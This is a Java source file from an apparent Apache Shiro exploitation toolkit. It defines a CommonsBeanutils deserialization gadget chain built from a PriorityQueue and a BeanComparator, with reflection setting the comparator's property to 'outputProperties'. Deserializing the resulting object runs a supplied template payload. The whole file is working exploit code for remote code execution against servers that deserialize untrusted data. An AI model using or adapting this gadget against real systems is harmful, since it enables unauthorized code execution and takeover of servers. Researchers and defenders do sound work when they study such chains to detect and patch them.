package com.liev.clouds.payload.shiro;

import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.util.PriorityQueue;
import java.util.Queue;

// org.apache.logging.log4j
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
@Authors({"SummerSec"})
public class CommonsBeanutilsPropertySource implements ObjectPayload<Queue<Object>>{

    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        PropertySource propertySource1 = new PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }

        };

        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

        queue.add(propertySource1);
        queue.add(propertySource1);


        ReflectionsUtils.setFieldValue(queue, "queue", new Object[] { template, template });

        ReflectionsUtils.setFieldValue(beanComparator, "property", "outputProperties");

        return (Queue)queue;
    }
}
